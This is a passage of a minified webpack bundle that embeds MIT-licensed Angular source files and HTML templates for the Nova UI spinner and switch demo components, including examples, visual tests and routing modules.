in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport { ChangeDetectionStrategy, Component } from "@angular/core";\n\n@Component({\n    selector: "nui-spinner-e2e",\n    templateUrl: "./spinner-test.html",\n    changeDetection: ChangeDetectionStrategy.OnPush,\n})\nexport class SpinnerTestComponent {\n    public show1: boolean;\n    public show2: boolean;\n    public spinPercentage: number;\n}\n'},33990:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='<style>\n    nui-spinner {\n        margin: 0px 10px;\n    }\n</style>\n<div class="container">\n    <h4>Basic spinner</h4>\n    <nui-spinner [show]="show"></nui-spinner>\n    <hr />\n\n    <h4>Big spinner</h4>\n    <nui-spinner size="large" [show]="show"></nui-spinner>\n    <hr />\n\n    <h4>Indetermined spinner with text</h4>\n    <nui-spinner\n        [show]="show"\n        message="Task Label"\n        helpText="Optional description"\n    >\n    </nui-spinner>\n    <nui-spinner\n        size="large"\n        [show]="show"\n        message="Task Label"\n        helpText="Optional description"\n    >\n    </nui-spinner>\n    <hr />\n\n    <h4>Determined spinner with text</h4>\n    <nui-spinner [show]="show" [percent]="spinPercentage"> </nui-spinner>\n    <nui-spinner size="large" [show]="show" [percent]="spinPercentage">\n    </nui-spinner>\n    <nui-spinner\n        size="large"\n        [show]="show"\n        [percent]="spinPercentage"\n        message="Task Label"\n        helpText="Optional description"\n    >\n    </nui-spinner>\n    <hr />\n\n    <h4>Spinner with cancellation</h4>\n    <nui-spinner\n        [show]="showWithCancel"\n        [percent]="spinPercentage"\n        [allowCancel]="true"\n        (cancel)="onCancel()"\n    >\n    </nui-spinner>\n    <nui-spinner\n        size="large"\n        [show]="showWithCancel"\n        [percent]="spinPercentage"\n        [allowCancel]="true"\n        (cancel)="onCancel()"\n        id="nui-spinner-large-cancel"\n    >\n    </nui-spinner>\n    <hr />\n</div>\n'},94258:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport { Component } from "@angular/core";\n\n@Component({\n    selector: "nui-spinner-visual",\n    templateUrl: "./spinner-visual-test.component.html",\n})\nexport class SpinnerVisualTestComponent {\n    public show: boolean = true;\n    public showWithCancel: boolean = true;\n    public isCanceled: boolean = false;\n    public spinPercentage: number = 0;\n\n    public onCancel(): void {\n        this.showWithCancel = false;\n        this.isCanceled = true;\n    }\n}\n'},19078:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='<button\n    nui-button\n    type="button"\n    (click)="toggleSpinners()"\n    displayStyle="primary"\n>\n    Start/stop progress\n</button>\n<nui-spinner\n    [show]="show"\n    [percent]="spinPercentage"\n    [allowCancel]="true"\n    (cancel)="onCancel()"\n>\n</nui-spinner>\n\n<nui-spinner\n    size="large"\n    [show]="show"\n    [percent]="spinPercentage"\n    [allowCancel]="true"\n    (cancel)="onCancel()"\n>\n</nui-spinner>\n'},70162:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport { Component, OnDestroy } from "@angular/core";\n\n@Component({\n    selector: "nui-spinner-with-cancel-example",\n    templateUrl: "./spinner-with-cancel.example.component.html",\n})\nexport class SpinnerWithCancelExampleComponent implements OnDestroy {\n    public show = false;\n    public spinPercentage = 0;\n    public isCanceled = false;\n\n    private interval: any = undefined;\n\n    public toggleSpinners(): void {\n        this.show = !this.show;\n        this.show ? this.startProgress() : this.onCancel();\n    }\n\n    public startProgress(): void {\n        this.clearInterval();\n        this.interval = setInterval(() => {\n            this.spinPercentage < 100\n                ? (this.spinPercentage += 10)\n                : this.onCancel();\n        }, 500);\n    }\n\n    public onCancel(): void {\n        this.clearInterval();\n        this.isCanceled = true;\n        this.show = false;\n        this.spinPercentage = 0;\n    }\n\n    public ngOnDestroy(): void {\n        this.clearInterval();\n    }\n\n    private clearInterval() {\n        if (this.interval) {\n            clearInterval(this.interval);\n            this.interval = undefined;\n        }\n    }\n}\n'},89438:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='<button\n    nui-button\n    type="button"\n    id="spinnerButton1"\n    (click)="toggleSpinners()"\n    displayStyle="primary"\n    i18n\n>\n    Start/stop progress\n</button>\n<nui-spinner\n    id="spinner1"\n    [show]="show"\n    [percent]="spinPercentage"\n    [delay]="500"\n>\n</nui-spinner>\n\n<nui-spinner\n    size="large"\n    [show]="show"\n    [percent]="spinPercentage"\n    [delay]="1000"\n>\n</nui-spinner>\n'},5050:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport { Component, OnDestroy } from "@angular/core";\n\n@Component({\n    selector: "nui-spinner-with-delay-toggle-example",\n    templateUrl: "./spinner-with-delay-toggle.example.component.html",\n})\nexport class SpinnerWithDelayToggleExampleComponent implements OnDestroy {\n    public show = false;\n    public spinPercentage = 0;\n    public isCanceled = false;\n\n    private interval: any = undefined;\n\n    public toggleSpinners(): void {\n        this.show = !this.show;\n        this.show ? this.startProgress() : this.onCancel();\n    }\n\n    public startProgress(): void {\n        this.clearInterval();\n        this.interval = setInterval(() => {\n            this.spinPercentage < 100\n                ? (this.spinPercentage += 10)\n                : this.onCancel();\n        }, 500);\n    }\n\n    public onCancel(): void {\n        this.clearInterval();\n        this.isCanceled = true;\n        this.show = false;\n        this.spinPercentage = 0;\n    }\n\n    public ngOnDestroy(): void {\n        this.clearInterval();\n    }\n\n    private clearInterval() {\n        if (this.interval) {\n            clearInterval(this.interval);\n            this.interval = undefined;\n        }\n    }\n}\n'},55734:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='<nui-spinner\n    size="large"\n    [show]="true"\n    message="Task Label"\n    i18n-message\n    helpText="Optional description"\n    i18n-helpText\n>\n</nui-spinner>\n'},88930:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport { Component } from "@angular/core";\n\n@Component({\n    selector: "nui-spinner-with-text-example",\n    templateUrl: "./spinner-with-text.example.component.html",\n})\nexport class SpinnerWithTextExampleComponent {}\n'},16483:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport { NgModule } from "@angular/core";\nimport { RouterModule } from "@angular/router";\n\nimport {\n    DEMO_PATH_TOKEN,\n    NuiButtonModule,\n    NuiDocsModule,\n    NuiSpinnerModule,\n    SrlcStage,\n} from "@nova-ui/bits";\n\nimport {\n    SpinnerBasicExampleComponent,\n    SpinnerDeterminateExampleComponent,\n    SpinnerExampleComponent,\n    SpinnerSizesExampleComponent,\n    SpinnerTestComponent,\n    SpinnerVisualTestComponent,\n    SpinnerWithCancelExampleComponent,\n    SpinnerWithDelayToggleExampleComponent,\n    SpinnerWithTextExampleComponent,\n} from "./index";\nimport { getDemoFiles } from "../../../static/demo-files-factory";\n\nconst routes = [\n    {\n        path: "",\n        component: SpinnerExampleComponent,\n        data: {\n            srlc: {\n                stage: SrlcStage.ga,\n            },\n            showThemeSwitcher: true,\n        },\n    },\n    {\n        path: "spinner-test",\n        component: SpinnerTestComponent,\n    },\n    {\n        path: "spinner-visual-test",\n        component: SpinnerVisualTestComponent,\n        data: {\n            srlc: {\n                hideIndicator: true,\n            },\n        },\n    },\n];\n\n@NgModule({\n    imports: [\n        NuiButtonModule,\n        NuiSpinnerModule,\n        NuiDocsModule,\n        RouterModule.forChild(routes),\n    ],\n    declarations: [\n        SpinnerBasicExampleComponent,\n        SpinnerDeterminateExampleComponent,\n        SpinnerTestComponent,\n        SpinnerVisualTestComponent,\n        SpinnerExampleComponent,\n        SpinnerSizesExampleComponent,\n        SpinnerWithCancelExampleComponent,\n        SpinnerWithDelayToggleExampleComponent,\n        SpinnerWithTextExampleComponent,\n    ],\n    providers: [\n        {\n            provide: DEMO_PATH_TOKEN,\n            useValue: getDemoFiles("spinner"),\n        },\n    ],\n    exports: [RouterModule],\n})\nexport default class SpinnerModule {}\n'},46243:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nexport * from "./switch-docs/switch-docs.example.component";\nexport * from "./switch-simple/switch-simple.example.component";\nexport * from "./switch-disable/switch-disable.example.component";\nexport * from "./switch-value-change/switch-value-change.example.component";\nexport * from "./switch-test/switch-test.component";\nexport * from "./switch-visual-test/switch-visual-test.component";\n'},457:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='<button\n    class="lead"\n    nui-button\n    type="button"\n    id="nui-switch-toggle-button"\n    (click)="isDisabled = !isDisabled"\n    displayStyle="primary"\n    i18n\n>\n    Toggle Enable\n</button>\n<nui-switch\n    id="nui-switch-disabled-example"\n    [(value)]="isOn"\n    [disabled]="isDisabled"\n    >{{ isOn ? "On" : "Off" }}\n</nui-switch>\n'},54821:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport { Component, Input } from "@angular/core";\n\n@Component({\n    selector: "nui-switch-disable-example",\n    templateUrl: "./switch-disable.example.component.html",\n})\nexport class SwitchDisableExampleComponent {\n    @Input() isOn = true;\n    isDisabled = true;\n}\n'},97257:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='<p>\n    <code>&lt;nui-switch&gt;</code> is a simple toggle control that can be\n    associated with a binary value. Use the <strong>value</strong> input to\n    control the value.\n</p>\n\n<h2>Required Modules</h2>\n<ul>\n    <li>\n        <code>NuiSwitchModule</code>\n    </li>\n</ul>\n\n<h2>Basic Usage</h2>\n<nui-example-wrapper filenamePrefix="switch-simple" exampleTitle="Basic Usage">\n    <nui-switch-simple-example></nui-switch-simple-example>\n</nui-example-wrapper>\n\n<h2>Value Change Callback</h2>\n<p>\n    For subscribing to value-change events, use the\n    <strong>valueChange</strong> callback\n</p>\n<nui-example-wrapper\n    filenamePrefix="switch-value-change"\n    exampleTitle="Value Change"\n>\n    <nui-switch-value-change-example></nui-switch-value-change-example>\n</nui-example-wrapper>\n\n<h2>Disabled Switch</h2>\n<p>Use the <strong>disabled</strong> input to enable/disable the switch</p>\n<nui-example-wrapper filenamePrefix="switch-disable" exampleTitle="Disable">\n    <nui-switch-disable-example></nui-switch-disable-example>\n</nui-example-wrapper>\n'},16421:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport { Component } from "@angular/core";\n\n@Component({\n    selector: "nui-switch-docs-example",\n    templateUrl: "./switch-docs.example.component.html",\n})\nexport class SwitchDocsExampleComponent {}\n'},29889:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='<nui-switch\n    id="nui-switch-simple-example"\n    [(value)]="isOn"\n    i18n\n    [ariaLabel]="isOn ? \'On\' : \'Off\'"\n>\n    {{ isOn ? "On" : "Off" }}\n</nui-switch>\n'},33421:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport { Component, Input } from "@angular/core";\n\n@Component({\n    selector: "nui-switch-simple-example",\n    templateUrl: "./switch-simple.example.component.html",\n})\nexport class SwitchSimpleExampleComponent {\n    @Input() isOn = true;\n}\n'},48937:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t="<nui-switch-simple-example></nui-switch-simple-example>\n<nui-switch-disable-example></nui-switch-disable-example>\n"},47173:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport { Component } from "@angular/core";\n\n@Component({\n    selector: "nui-switch-test",\n    templateUrl: "./switch-test.component.html",\n})\nexport class SwitchTestComponent {}\n'},6625:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='<nui-switch\n    id="switch-value-change-example"\n    [value]="isOn"\n    (valueChange)="onValueChanged($event)"\n>\n    {{ changeMessage }}\n</nui-switch>\n'},11821:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport { Component, Input } from "@angular/core";\n\n@Component({\n    selector: "nui-switch-value-change-example",\n    templateUrl: "./switch-value-change.example.component.html",\n})\nexport class SwitchValueChangeExampleComponent {\n    @Input() isOn = true;\n    private valueChangeCount = 0;\n    public changeMessage = $localize`Value has not changed`;\n\n    constructor() {}\n\n    public onValueChanged(value: boolean): void {\n        this.isOn = value;\n        ++this.valueChangeCount;\n        this.changeMessage = $localize`Value changed ${this.valueChangeCount} times.`;\n    }\n}\n'},16495:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='<div class="container">\n    <div class="row">\n        <div class="col">\n            <h3>Basic switch is ON</h3>\n            <nui-switch id="nui-switch-simple-example" [(value)]="isOn">\n                {{ isOn ? "On" : "Off" }}\n            </nui-switch>\n        </div>\n\n        <div class="col">\n            <h3>Basic switch is ON and disabled</h3>\n            <nui-switch\n                id="nui-switch-simple-example"\n                [(value)]="isOn"\n                [disabled]="isDisabled"\n            >\n                {{ isOn ? "On" : "Off" }}\n            </nui-switch>\n        </div>\n    </div>\n\n    <div class="row">\n        <div class="col">\n            <h3>Basic switch is OFF</h3>\n            <nui-switch id="nui-switch-disabled-example" [(value)]="isEnabled"\n                >{{ isEnabled ? "On" : "Off" }}\n            </nui-switch>\n        </div>\n\n        <div class="col">\n            <h3>Basic switch is OFF and disabled</h3>\n            <nui-switch\n                id="nui-switch-disabled-example"\n                [(value)]="isEnabled"\n                [disabled]="isDisabled"\n                >{{ isEnabled ? "On" : "Off" }}\n            </nui-switch>\n        </div>\n    </div>\n</div>\n'},2199:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport { Component, Input } from "@angular/core";\n\n@Component({\n    selector: "nui-switch-visual",\n    templateUrl: "./switch-visual-test.component.html",\n})\nexport class SwitchVisualTestComponent {\n    @Input() isOn = true;\n    @Input() isEnabled = false;\n    public isDisabled = true;\n}\n'},56665:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport { NgModule } from "@angular/core";\nimport { RouterModule } from "@angular/router";\n\nimport {\n    DEMO_PATH_TOKEN,\n    NuiButtonModule,\n    NuiDocsModule,\n    NuiSwitchModule,\n    SrlcStage,\n} from "@nova-ui/bits";\n\nimport {\n    SwitchDisableExampleComponent,\n    SwitchDocsExampleComponent,\n    SwitchSimpleExampleComponent,\n    SwitchTestComponent,\n    SwitchValueChangeExampleComponent,\n    SwitchVisualTestComponent,\n} from "./index";\nimport { getDemoFiles } from "../../../static/demo-files-factory";\n\nconst routes = [\n    {\n        path: "",\n        component: SwitchDocsExampleComponent,\n        data: {\n            srlc: {\n                stage: SrlcStage.ga,\n            },\n            showThemeSwitcher: true,\n        },\n    },\n    {\n        path: 